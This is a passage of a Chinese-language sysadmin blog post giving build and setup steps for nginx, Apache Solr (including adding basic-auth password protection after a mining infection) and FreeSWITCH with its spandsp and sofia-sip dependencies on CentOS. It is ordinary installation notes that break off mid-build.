</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-v" data-lang="v"><span style="display:flex;"><span>./configure \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--prefix=/usr/local/nginx \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--pid-path=/usr/local/nginx/run \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--user=nginx \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--group=nginx \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--with-http_ssl_module \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--with-http_flv_module \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--with-http_stub_status_module \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--with-http_gzip_static_module \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--with-pcre \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--with-http_image_filter_module \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--with-debug \
</span></span></code></pre></td></tr></table>
</div>
</div><p>ok了。</p>
<p><a href="https://blog.csdn.net/cailongbiaoyuli/article/details/84348866">make报错参考</a></p>
<h2 id="solr">solr<a hidden class="anchor" aria-hidden="true" href="#solr">#</a></h2>
<p><a href="https://lucene.apache.org/solr/downloads.html">官网下载最新的solr</a>
下载Binary releases-zip包，下载后上传到服务器<code>/usr/local/src</code>，cp到<code>/usr/local</code>下，解压<code>unzip solr-8.2.0.zip</code>。
进入bin目录，执行<code>./solr -start</code></p>
<p>提示：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*** [WARN] ***  Your Max Processes Limit is currently 63473. 
</span></span><span style="display:flex;"><span> It should be set to 65000 to avoid operational disruption. 
</span></span><span style="display:flex;"><span> If you no longer wish to see this warning, set SOLR_ULIMIT_CHECKS to false in your profile or solr.in.sh
</span></span><span style="display:flex;"><span>WARNING: Starting Solr as the root user is a security risk and not considered best practice. Exiting.
</span></span><span style="display:flex;"><span>         Please consult the Reference Guide. To override this check, start with argument &#39;-force&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>根据提示再次执行：
<code>./solr start -force</code>
最后提示：
<code>Started Solr server on port 8983 (pid=27222). Happy searching!</code>
证明启动成功，打开服务器访问：
<code>你的ip:8983</code>
就可以看到solr的web页面了。</p>
<p>如果不能访问，可能是你服务器的端口没开，请设置服务器的安全组。</p>
<h3 id="创建core">创建core<a hidden class="anchor" aria-hidden="true" href="#创建core">#</a></h3>
<p>选择左侧CoreAdmin，再选择Add Core，输入核心的名称和实例路径，后边三个默认就好。
点击Add Core提交信息，这里我遇到了一个错误信息，如下：
<code>Can't find resource 'solrconfig.xml' in classpath orc</code>
意思是在核心目录下找不到相应的配置文件，解决办法：将下面路径的conf文件夹copy到新创建的core目录下 /usr/local/solr-8.0.0/server/solr/new_core。
<code>/usr/local/solr-8.2.0/server/solr/configsets/_default</code>
执行复制命令
<code>cp -r conf ../../new_core/</code>
然后再去创建，就成功了。</p>
<h3 id="给solr添加访问密码">给solr添加访问密码<a hidden class="anchor" aria-hidden="true" href="#给solr添加访问密码">#</a></h3>
<p>昨天因为没给solr添加访问密码，导致服务器被挖矿病毒攻击，服务器无法访问，数据库无法访问。还好今天把数据恢复了。</p>
<p>创建并编辑文件
<code>vim /usr/local/solr-8.2.0/server/etc/verify.properties</code>
输入如下内容：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>#用户名 密码 权限
</span></span><span style="display:flex;"><span>user:pass,admin
</span></span></code></pre></td></tr></table>
</div>
</div><p>也可以配置多用户：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>#用户名 密码 权限
</span></span><span style="display:flex;"><span>user: pass,admin
</span></span><span style="display:flex;"><span>user1: pass,admin
</span></span><span style="display:flex;"><span>user3: pass,admin
</span></span></code></pre></td></tr></table>
</div>
</div><p>继续编辑文件
<code>vim /usr/local/solr-8.2.0/server/contexts/solr-jetty-context.xml</code>
初始文件内容如下:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;?xml version=&#34;1.0&#34;?&gt;
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE Configure PUBLIC &#34;-//Jetty//Configure//EN&#34; &#34;http://www.eclipse.org/jetty/configure_9_0.dtd&#34;&gt;
</span></span><span style="display:flex;"><span>&lt;Configure class=&#34;org.eclipse.jetty.webapp.WebAppContext&#34;&gt;
</span></span><span style="display:flex;"><span>  &lt;Set name=&#34;contextPath&#34;&gt;&lt;Property name=&#34;hostContext&#34; default=&#34;/solr&#34;/&gt;&lt;/Set&gt;
</span></span><span style="display:flex;"><span>  &lt;Set name=&#34;war&#34;&gt;&lt;Property name=&#34;jetty.base&#34;/&gt;/solr-webapp/webapp&lt;/Set&gt;
</span></span><span style="display:flex;"><span>  &lt;Set name=&#34;defaultsDescriptor&#34;&gt;&lt;Property name=&#34;jetty.base&#34;/&gt;/etc/webdefault.xml&lt;/Set&gt;
</span></span><span style="display:flex;"><span>  &lt;Set name=&#34;extractWAR&#34;&gt;false&lt;/Set&gt;
</span></span><span style="display:flex;"><span>&lt;/Configure&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>添加如下内容，注意要写在Configure标签中：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;Get name=&#34;securityHandler&#34;&gt;
</span></span><span style="display:flex;"><span> &lt;Set name=&#34;loginService&#34;&gt;
</span></span><span style="display:flex;"><span>	 &lt;New class=&#34;org.eclipse.jetty.security.HashLoginService&#34;&gt;
</span></span><span style="display:flex;"><span>		&lt;Set name=&#34;name&#34;&gt;verify—name&lt;/Set&gt;
</span></span><span style="display:flex;"><span>		&lt;Set name=&#34;config&#34;&gt;&lt;SystemProperty name=&#34;jetty.home&#34; default=&#34;.&#34;/&gt;/etc/verify.properties&lt;/Set&gt;
</span></span><span style="display:flex;"><span>	 &lt;/New&gt;
</span></span><span style="display:flex;"><span> &lt;/Set&gt;
</span></span><span style="display:flex;"><span>&lt;/Get&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>继续编辑文件
<code>vim /usr/local/solr-8.2.0/server/solr-webapp/webapp/WEB-INF/web.xml</code></p>
<p>找到如下内容：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  &lt;!-- Get rid of error message --&gt;
</span></span><span style="display:flex;"><span>  &lt;security-constraint&gt;
</span></span><span style="display:flex;"><span>    &lt;web-resource-collection&gt;
</span></span><span style="display:flex;"><span>      &lt;web-resource-name&gt;Disable TRACE&lt;/web-resource-name&gt;
</span></span><span style="display:flex;"><span>      &lt;url-pattern&gt;/&lt;/url-pattern&gt;
</span></span><span style="display:flex;"><span>      &lt;http-method&gt;TRACE&lt;/http-method&gt;
</span></span><span style="display:flex;"><span>    &lt;/web-resource-collection&gt;
</span></span><span style="display:flex;"><span>    &lt;auth-constraint/&gt;
</span></span><span style="display:flex;"><span>  &lt;/security-constraint&gt;
</span></span><span style="display:flex;"><span>  &lt;security-constraint&gt;
</span></span><span style="display:flex;"><span>    &lt;web-resource-collection&gt;
</span></span><span style="display:flex;"><span>      &lt;web-resource-name&gt;Enable everything but TRACE&lt;/web-resource-name&gt;
</span></span><span style="display:flex;"><span>      &lt;url-pattern&gt;/&lt;/url-pattern&gt;
</span></span><span style="display:flex;"><span>      &lt;http-method-omission&gt;TRACE&lt;/http-method-omission&gt;
</span></span><span style="display:flex;"><span>    &lt;/web-resource-collection&gt;
</span></span><span style="display:flex;"><span>  &lt;/security-constraint&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>在下边添加</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;security-constraint&gt;
</span></span><span style="display:flex;"><span>&lt;web-resource-collection&gt;
</span></span><span style="display:flex;"><span>  &lt;web-resource-name&gt;Solr&lt;/web-resource-name&gt;
</span></span><span style="display:flex;"><span>  &lt;url-pattern&gt;/&lt;/url-pattern&gt;
</span></span><span style="display:flex;"><span>&lt;/web-resource-collection&gt;   
</span></span><span style="display:flex;"><span> &lt;auth-constraint&gt;      
</span></span><span style="display:flex;"><span>	&lt;role-name&gt;admin&lt;/role-name&gt; 
</span></span><span style="display:flex;"><span> &lt;/auth-constraint&gt; 
</span></span><span style="display:flex;"><span>&lt;/security-constraint&gt;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>&lt;login-config&gt;      
</span></span><span style="display:flex;"><span>	&lt;auth-method&gt;BASIC&lt;/auth-method&gt; 
</span></span><span style="display:flex;"><span>	&lt;realm-name&gt;verify-name&lt;/realm-name&gt;   
</span></span><span style="display:flex;"><span>&lt;/login-config&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后启动solr，就会让输入用户名密码了。</p>
<p>另外也可以通过solr地址中加入用户名密码的方式登录，直接进入主界面,地址如下：
<code>http://user:pass@localhost:8088/solr/</code></p>
<h2 id="freeswitch">freeswitch<a hidden class="anchor" aria-hidden="true" href="#freeswitch">#</a></h2>
<p><a href="https://www.cnblogs.com/lzpong/p/6740188.html">安装参考1</a></p>
<p><a href="https://blog.csdn.net/xxm524/article/details/125582663">安装参考2</a></p>
<p><a href="https://www.cnblogs.com/hezhixiong/p/4891151.html">参考3</a></p>
<p>freeswitch的依赖非常多，如果不安装依赖就开始编译freeswitch，那就遇到更多的问题，安装依赖之后，可以解决90%以上的问题。</p>
<p>安装依赖命令如下：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>yum install -y https://files.freeswitch.org/repo/yum/centos-release/freeswitch-release-repo-0-1.noarch.rpm epel-release 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>yum install -y yum-utils --enablerepo=extras 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>yum install -y yum-plugin-ovl centos-release-scl rpmdevtools yum-utils git wget vim devtoolset-7-gcc* devtoolset-7 libtiff-devel cmake3 libatomic unixODBC unixODBC-devel.x86_64 postgresql-libs postgresql-devel libpqxx-devel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>yum install -y gcc-c++ autoconf automake libtool ncurses-devel zlib-devel libjpeg-devel openssl-devel e2fsprogs-devel sqlite-devel libcurl-devel pcre-devel speex-devel ldns-devel libedit-devel libxml2-devel libyuv-devel libvpx-devel libvpx2* libdb4* libidn-devel unbound-devel libuuid-devel lua-devel libsndfile-devel yasm-devel
</span></span></code></pre></td></tr></table>
</div>
</div><p>另外有两个比较重新的库需要手动安装，分别是spandsp和sofia-sip</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">cd</span> /data
</span></span><span style="display:flex;"><span><span style="color:#007f7f"># 下载freeswitch</span>
</span></span><span style="display:flex;"><span>git clone -b v1.10.7 https://github.com/signalwire/freeswitch
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">cd</span> /data/freeswitch
</span></span><span style="display:flex;"><span>git clone https://github.com/freeswitch/spandsp.git
</span></span><span style="display:flex;"><span>git clone https://github.com/freeswitch/sofia-sip.git
</span></span></code></pre></td></tr></table>
</div>
</div><p>首先，要先编译<code>spandsp</code>和<code>sofia-sip</code>， 否则freeswitch在configure阶段会报错。</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#007f7f">#编译spandsp</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">cd</span> /data/freeswitch/spandsp
</span></span><span style="display:flex;"><span>./bootstrap.sh
</span></span><span style="display:flex;"><span>./configure
</span></span><span style="display:flex;"><span>make
</span></span><span style="display:flex;"><span>make install
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#编译sofia-sip</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">cd</span> /data/freeswitch/sofia-sip
</span></span><span style="display:flex;"><span>./bootstrap.sh
</span></span><span style="display:flex;"><span>./configure
</span></span><span style="display:flex;"><span>make
</span></span><span style="display:flex;"><span>make install
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">#添加库的路径到系统</span>
